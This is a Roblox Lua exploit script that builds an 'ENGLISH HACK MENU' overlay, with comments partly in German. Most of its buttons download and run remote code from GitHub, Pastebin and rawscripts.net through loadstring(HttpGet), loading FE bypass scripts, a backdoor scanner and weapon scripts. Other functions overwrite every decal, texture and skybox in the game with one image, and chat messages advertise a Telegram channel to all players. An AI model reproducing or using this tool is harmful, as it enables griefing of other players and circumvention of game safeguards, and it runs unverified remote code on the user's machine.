local targetTextureID = "118352232383553"
local rbxAssetURL = "rbxassetid://" .. targetTextureID

if not _G.EnglishMenu then
    _G.EnglishMenu = true
    
    -- ========== FUNCTIONS ========== --
    
    -- 1. Mobile Keyboard Executor (ZUR√úCKGEKEHRT)
    local function executeMobileKeyboard()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ Mobile Keyboard activated", "All")
        end)
    end

    -- 2. Knife FE v4 Executor
    local function executeKnifeFE()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ Knife FE v4 executed", "All")
        end)
    end

    -- 3. SSP Executor
    local function executeSSP()
        pcall(function()
            loadstring(game:HttpGet("https://pastebin.com/raw/E5k09bh1", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("SSP executed - idk if it FE bypass", "All")
        end)
    end

    -- 4. LALOL Hub Executor with Telegram message
    local function executeLALOLHub()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("want GUI type t.me/Voidimtraviskott", "All")
        end)
    end

    -- 5. AK47 FE Executor
    local function executeAK47FE()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47", true))()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ AK47 FE executed", "All")
        end)
    end

    -- 6. Decal Spam Function
    local function decalSpam()
        pcall(function()
            local replacedDecals = 0
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("Decal") or obj:IsA("Texture") then
                    pcall(function()
                        obj.Texture = rbxAssetURL
                        replacedDecals += 1
                    end)
                end
            end
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ " .. replacedDecals .. " Decals replaced", "All")
        end)
    end

    -- 7. Sky Texture Replacement
    local function replaceSky()
        pcall(function()
            local lighting = game:GetService("Lighting")
            local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
            sky.Parent = lighting
            sky.SkyboxBk = rbxAssetURL
            sky.SkyboxDn = rbxAssetURL
            sky.SkyboxFt = rbxAssetURL
            sky.SkyboxLf = rbxAssetURL
            sky.SkyboxRt = rbxAssetURL
            sky.SkyboxUp = rbxAssetURL
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("‚úÖ Sky texture changed", "All")
        end)
    end

    -- 8. Caducus FE Executor
    local function executeCaducusFE()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
        end)
    end

    -- 9. FE Animations Executor
    local function executeFEAnimations()
        pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/UFE', true))()
        end)
    end

    -- ========== VOLLST√ÑNDIGES MEN√ú ========== --
    
    local function createMenu()
        if game:GetService("CoreGui"):FindFirstChild("EnglishHackMenu") then
            game:GetService("CoreGui").EnglishHackMenu:Destroy()
        end

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "EnglishHackMenu"
        ScreenGui.Parent = game:GetService("CoreGui")
        ScreenGui.ResetOnSpawn = false

        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Size = UDim2.new(0.7, 0, 0.95, 0)
        MainFrame.Position = UDim2.new(0.02, 0, 0.025, 0)
        MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        MainFrame.BorderColor3 = Color3.fromRGB(255, 100, 0)
        MainFrame.BorderSizePixel = 2
        MainFrame.Active = true
        MainFrame.Parent = ScreenGui

        local Title = Instance.new("TextLabel")
        Title.Size = UDim2.new(1, 0, 0.04, 0)
        Title.Text = "üîß ENGLISH HACK MENU"
        Title.TextColor3 = Color3.fromRGB(255, 100, 0)
        Title.BackgroundTransparency = 1
        Title.Font = Enum.Font.SourceSansBold
        Title.TextSize = 16
        Title.Parent = MainFrame

        -- ScrollFrame f√ºr viele Buttons
        local ScrollFrame = Instance.new("ScrollingFrame")
        ScrollFrame.Size = UDim2.new(1, 0, 0.93, 0)
        ScrollFrame.Position = UDim2.new(0, 0, 0.04, 0)
        ScrollFrame.CanvasSize = UDim2.new(0, 0, 3.0, 0)
        ScrollFrame.ScrollBarThickness = 6
        ScrollFrame.Parent = MainFrame

        -- Menu buttons mit zur√ºckgekehrter Mobile Keyboard Funktion
        local buttons = {
            {Text = "üì± MOBILE KEYBOARD", Pos = 0.02, Color = Color3.fromRGB(150, 0, 150), Func = executeMobileKeyboard},
            {Text = "üî™ KNIFE FE v4", Pos = 0.10, Color = Color3.fromRGB(200, 0, 0), Func = executeKnifeFE},
            {Text = "üïµÔ∏è SSP SCRIPT", Pos = 0.18, Color = Color3.fromRGB(0, 100, 200), Func = executeSSP},
            {Text = "üé® DECAL SPAM", Pos = 0.26, Color = Color3.fromRGB(0, 150, 255), Func = decalSpam},
            {Text = "üåå SKY REPLACE", Pos = 0.34, Color = Color3.fromRGB(100, 0, 200), Func = replaceSky},
            {Text = "‚ö° CADUCUS FE", Pos = 0.42, Color = Color3.fromRGB(139, 0, 139), Func = executeCaducusFE},
            {Text = "üî´ AK47 FE", Pos = 0.50, Color = Color3.fromRGB(150, 0, 0), Func = executeAK47FE},
            {Text = "üíÉ FE ANIMATIONS", Pos = 0.58, Color = Color3.fromRGB(255, 100, 0), Func = executeFEAnimations},
            {Text = "üïµÔ∏è LALOL HUB", Pos = 0.66, Color = Color3.fromRGB(0, 100, 255), Func = executeLALOLHub}
        }

        for _, btn in ipairs(buttons) do
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0.9, 0, 0.09, 0)
            button.Position = UDim2.new(0.05, 0, btn.Pos, 0)
            button.Text = btn.Text
            button.BackgroundColor3 = btn.Color
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 11
            button.BorderSizePixel = 1
            button.BorderColor3 = Color3.fromRGB(50, 50, 50)
            button.Parent = ScrollFrame
            button.MouseButton1Click:Connect(btn.Func)
        end

        -- Info Text
        local InfoText = Instance.new("TextLabel")
        InfoText.Size = UDim2.new(0.9, 0, 0.25, 0)
        InfoText.Position = UDim2.new(0.05, 0, 0.78, 0)
        InfoText.Text = "üìã FEATURES:\n‚Ä¢ Mobile Keyboard\n‚Ä¢ Knife FE v4\n‚Ä¢ SSP Script\n‚Ä¢ Decal Spam System\n‚Ä¢ Sky Texture Replacement\n‚Ä¢ Caducus FE Bypass\n‚Ä¢ AK47 FE Weapon\n‚Ä¢ FE Animations Hub\n‚Ä¢ LALOL Hub Scanner\n\nüîó Telegram: t.me/Voidimtraviskott"
        InfoText.TextColor3 = Color3.fromRGB(200, 200, 100)
        InfoText.BackgroundTransparency = 1
        InfoText.Font = Enum.Font.SourceSans
        InfoText.TextSize = 10
        InfoText.TextXAlignment = Enum.TextXAlignment.Left
        InfoText.Parent = ScrollFrame

        -- Close Button
        local CloseButton = Instance.new("TextButton")
        CloseButton.Size = UDim2.new(0.12, 0, 0.04, 0)
        CloseButton.Position = UDim2.new(0.84, 0, 0.005, 0)
        CloseButton.Text = "X"
        CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        CloseButton.Font = Enum.Font.SourceSansBold
        CloseButton.TextSize = 14
        CloseButton.Parent = MainFrame
        CloseButton.MouseButton1Click:Connect(function()
            ScreenGui:Destroy()
        end)

        -- ========== BEWEGUNGSSYSTEM ========== --
        
        local UserInputService = game:GetService("UserInputService")
        local dragging = false
        local dragStart = Vector3.new()
        local startPos = UDim2.new()

        local function updateDrag(input)
            if dragging and input.UserInputType == Enum.UserInputType.Touch then
                local delta = Vector3.new(input.Position.X, input.Position.Y, 0) - dragStart
                local newX = math.clamp(startPos.X.Offset + delta.X, 0, 500)
                local newY = math.clamp(startPos.Y.Offset + delta.Y, 0, 200)
                MainFrame.Position = UDim2.new(0, newX, 0, newY)
            end
        end

        MainFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = Vector3.new(input.Position.X, input.Position.Y, 0)
                startPos = MainFrame.Position
                MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
            end
        end)

        MainFrame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
                MainFrame.BorderColor3 = Color3.fromRGB(255, 100, 0)
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            updateDrag(input)
        end)
    end

    -- Men√º erstellen
    createMenu()

    -- Auto-restore after respawn
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        if not game:GetService("CoreGui"):FindFirstChild("EnglishHackMenu") then
            createMenu()
        end
    end)
end
